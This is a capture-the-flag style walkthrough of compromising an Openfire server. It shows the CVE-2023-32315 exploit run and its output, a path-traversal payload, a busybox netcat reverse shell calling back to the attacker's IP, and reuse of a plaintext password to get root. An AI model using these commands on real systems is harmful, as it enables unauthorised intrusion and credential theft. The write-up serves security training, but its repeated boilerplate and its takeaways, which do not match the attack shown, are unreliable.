## Overview

| Field                     | Value |
|---------------------------|-------|
| OS                        | Linux |
| Difficulty                | Not specified |
| Attack Surface            | Web application and exposed network services |
| Primary Entry Vector      | Web RCE (CVE-2023-32315) |
| Privilege Escalation Path | Local enumeration -> misconfiguration abuse -> root |

## Credentials

No credentials obtained.

## Reconnaissance

---
💡 Why this works  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## Initial Foothold

---

*Caption: Screenshot captured during this stage of the assessment.*

https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
python3 CVE-2023-32315.py -u http://192.168.200.96:9090
```

```bash
✅[0:02][CPU:32][MEM:64][TUN0:192.168.45.178][...ed/CVE-2023-32315-EXPLOIT]
🐉 > python3 CVE-2023-32315.py -u http://192.168.200.96:9090

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████

Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Launching exploit against: http://192.168.200.96:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW

```


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*


*Caption: Screenshot captured during this stage of the assessment.*

Retrieved local.txt:
`2590f1225d2dd2a4d0961714b11afd29`
💡 Why this works  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## Privilege Escalation

---
`/bin/busybox nc 192.168.45.178 80 -e /bin/bash`
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
rlwrap -cAri nc -lvnp 80
```

```bash
❌[2:35][CPU:23][MEM:63][TUN0:192.168.45.178][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 80
listening on [any] 80 ...
openfire@openfire:/$

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat openfire.script
```

```bash
openfire@openfire:/var/lib/openfire/embedded-db$ cat openfire.script
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)

```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
su - root
```

```bash
openfire@openfire:/var/lib/openfire/embedded-db$ su - root
Password: OpenFireAtEveryone
```

At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.

```bash
cat proof.txt
```

```bash
root@openfire:~# cat proof.txt
2b261aa40f8020a44ad5a6d2fda10327
```

💡 Why this works  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## Lessons Learned / Key Takeaways

- Validate framework debug mode and error exposure in production-like environments.
- Restrict file permissions on scripts and binaries executed by privileged users or schedulers.
- Harden sudo policies to avoid wildcard command expansion and scriptable privileged tools.
- Treat exposed credentials and environment files as critical secrets.

### Attack Flow

---
At this stage, the following command(s) are executed to progress the attack chain and validate the next hypothesis. We are specifically looking for actionable indicators such as open services, exploitability, credential exposure, or privilege boundaries. Key flags and parameters are preserved to keep the workflow reproducible for follow-along testing.



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>22/9090/9091]
        K1C[Openfire発見<br/>Port 9090/9091]
        K1D[バージョン特定<br/>Openfire 4.7.3]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>脆弱性特定"]
        direction TB
        K2A[CVE検索<br/>CVE-2023-32315]
        K2B[脆弱性確認<br/>Auth Bypass]
        K2C[エクスプロイト選定<br/>K3ysTr0K3R版]
        K2D[攻撃可能判定<br/>3.10.0-4.7.4]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>初期侵入"]
        direction TB
        K3A[Path Traversal<br/>setup-s/%u002e%u002e]
        K3B[認証バイパス<br/>user-create.jsp]
        K3C[管理者作成<br/>hugme:HugmeNOW]
        K3D[Admin Console<br/>ログイン成功]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>RCE取得"]
        direction TB
        K4A[プラグイン準備<br/>management-tool]
        K4B[プラグインアップロード<br/>Admin Console]
        K4C[Webシェルアクセス<br/>management-tool.jsp]
        K4D[OSコマンド実行<br/>Command Injection]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>シェル確立"]
        direction TB
        K5A[リバースシェル<br/>busybox nc]
        K5B[openfireユーザー<br/>uid=114]
        K5C[環境確認<br/>id/groups]
        K5D[local.txt取得<br/>2590f122...]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>権限昇格準備"]
        direction TB
        K6A[ファイル列挙<br/>/var/lib/openfire]
        K6B[データベース発見<br/>embedded-db/]
        K6C[スクリプト確認<br/>openfire.script]
        K6D[内容精査<br/>cat openfire.script]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>認証情報発見"]
        direction TB
        K7A[SMTP設定発見<br/>mail.smtp.*]
        K7B[パスワード抽出<br/>OpenFireAtEveryone]
        K7C[ユーザー確認<br/>username=root]
        K7D[認証情報確定<br/>root:OpenFireAtEveryone]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格"]
        direction TB
        K8A[su実行<br/>su - root]
        K8B[パスワード入力<br/>OpenFireAtEveryone]
        K8C[rootシェル確立<br/>uid=0 gid=0]
        K8D[proof.txt取得<br/>2b261aa4...]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[完全制御<br/>root access]
        K9B[フラグ回収<br/>local + proof]
        K9C[永続化可能<br/>SSH Key等]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#81d4fa
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K8C fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## References

- CVE-2023-32315: https://nvd.nist.gov/vuln/detail/CVE-2023-32315
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
